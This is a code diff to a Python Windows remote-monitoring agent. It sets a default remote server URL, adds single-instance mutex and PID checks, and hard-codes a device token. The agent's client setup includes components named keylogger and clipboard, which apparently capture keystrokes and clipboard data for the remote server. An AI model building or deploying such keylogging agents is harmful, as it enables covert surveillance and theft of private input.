@@ -67,7 +67,10 @@ BUILD COMMAND:
     agent_v9.py
 
 RENDER / PRODUCTION:
-  Change SERVER_URL below to your Render URL before compiling.
+  SERVER_URL is read from the MVIEW_SERVER_URL environment variable at runtime.
+  Default: https://screen-connect-rtca.onrender.com
+  Set env var before compiling OR pass via env at launch:
+    set MVIEW_SERVER_URL=https://your-app.onrender.com
 """
 import os
 import sys
@@ -130,6 +133,38 @@ _AGENT_EXE_NAME = "master_agent.exe"
 _WIN32_MUTEX    = None
 
 
+def _is_already_running() -> bool:
+    """Return True if a live instance of this agent is already running."""
+    my_pid = os.getpid()
+    # Check PID file first (fast path)
+    try:
+        if os.path.exists(_PID_FILE):
+            with open(_PID_FILE) as fh:
+                pid = int(fh.read().strip())
+            if pid != my_pid:
+                try:
+                    import psutil as _ps
+                    p = _ps.Process(pid)
+                    if p.is_running() and _AGENT_EXE_NAME.lower() in (p.name() or "").lower():
+                        return True  # another live agent — bail out
+                except Exception:
+                    pass
+    except Exception:
+        pass
+    # Mutex check (catches edge cases where PID file is stale)
+    try:
+        import ctypes as _ct
+        test = _ct.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
+        last_err = _ct.windll.kernel32.GetLastError()
+        if last_err == 183:   # ERROR_ALREADY_EXISTS
+            _ct.windll.kernel32.CloseHandle(test)
+            return True
+        # We own the mutex — keep it
+        return False
+    except Exception:
+        return False
+
+
 def _kill_stale_instances():
     my_pid = os.getpid()
     killed = []
@@ -137,7 +172,8 @@ def _kill_stale_instances():
         import psutil as _ps
         for proc in _ps.process_iter(["pid", "name"]):
             try:
-                if (proc.info["name"] or "").lower() == _AGENT_EXE_NAME.lower()                         and proc.pid != my_pid:
+                if (proc.info["name"] or "").lower() == _AGENT_EXE_NAME.lower() \
+                        and proc.pid != my_pid:
                     proc.terminate()
                     try: proc.wait(timeout=3)
                     except Exception: proc.kill()
@@ -161,6 +197,7 @@ def _write_pid_file():
 
 
 def _acquire_single_instance_lock():
+    """Kill stale instances, write PID, acquire global mutex. Call at startup only."""
     global _WIN32_MUTEX
     killed = _kill_stale_instances()
     if killed: time.sleep(0.5)
@@ -169,16 +206,12 @@ def _acquire_single_instance_lock():
         import ctypes as _ct
         _WIN32_MUTEX = _ct.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
         if _ct.windll.kernel32.GetLastError() == 183:
+            # Mutex already exists — release and re-acquire (handles crash recovery)
             _ct.windll.kernel32.ReleaseMutex(_WIN32_MUTEX)
             _ct.windll.kernel32.CloseHandle(_WIN32_MUTEX)
             time.sleep(0.2)
             _WIN32_MUTEX = _ct.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
     except Exception: pass
-
-
-if __name__ == "__main__":
-    # relocate_agent()
-    _acquire_single_instance_lock()
 
 
 # ── Third-Party ────────────────────────────────────────────────────────────────
@@ -289,7 +322,7 @@ CONFIG = {
     # ── Connection ──────────────────────────────────────────────────────────
     # For Local LAN testing: Use http://YOUR_PC_IP:10000
     # For Render live: Use https://your-app.onrender.com
-    "SERVER_URL":           "http://localhost:10000",
+    "SERVER_URL":           os.environ.get("MVIEW_SERVER_URL", "https://screen-connect-rtca.onrender.com"),
     "DEVICE_TOKEN":         "MV-5F3B23-8BD7A7-4B1392",
 
     # ── Identity ────────────────────────────────────────────────────────────
@@ -1298,9 +1331,8 @@ async def _adv_main(server_url: str, token: str):
     """Async entry for the advanced monitor — mirrors second-site agent main()."""
     global _adv_sio_async, _adv_authed, _adv_viewers, _adv_auth_event
 
-    # FIX: Force http if connecting to a local IP to avoid common SSL/TLS errors in local dev
-    if "192.168." in server_url or "10.0." in server_url or "localhost" in server_url:
-        server_url = server_url.replace("https://", "http://")
+    # Always strip trailing slash for clean URL
+    server_url = server_url.rstrip("/")
 
     _adv_auth_event = asyncio.Event()
     import socketio as _sio_mod
@@ -5012,10 +5044,7 @@ class ScreenConnectAgent:
                 sio, sys_monitor, heartbeat, keylogger, clipboard, alerts, \
                     quality_rep, net_detector = self._make_client()
                 
-                # FIX: Force http if connecting to a local IP to avoid common SSL/TLS errors in local dev
-                url = CONFIG["SERVER_URL"]
-                if "192.168." in url or "10.0." in url or "localhost" in url:
-                    url = url.replace("https://", "http://")
+                url = CONFIG["SERVER_URL"].rstrip("/")
                 
                 log.info(f"Connecting to {url}...")
                 sio.connect(
@@ -5159,6 +5188,21 @@ def _global_exception_handler(exc_type, exc_val, exc_tb):
 
 
 if __name__ == "__main__":
+    # ── SINGLE-INSTANCE GATE ─────────────────────────────────────────────
+    # Check BEFORE acquiring lock. If another live agent is already running,
+    # exit silently — no double-agent, no flickering, no orphan processes.
+    if _is_already_running():
+        # Optionally bring existing window to front (best-effort)
+        try:
+            import ctypes as _ct2
+            _ct2.windll.user32.ShowWindow(
+                _ct2.windll.kernel32.GetConsoleWindow(), 9  # SW_RESTORE
+            )
+        except Exception:
+            pass
+        sys.exit(0)
+    _acquire_single_instance_lock()
+
     # Install global crash handler
     sys.excepthook = _global_exception_handler
 
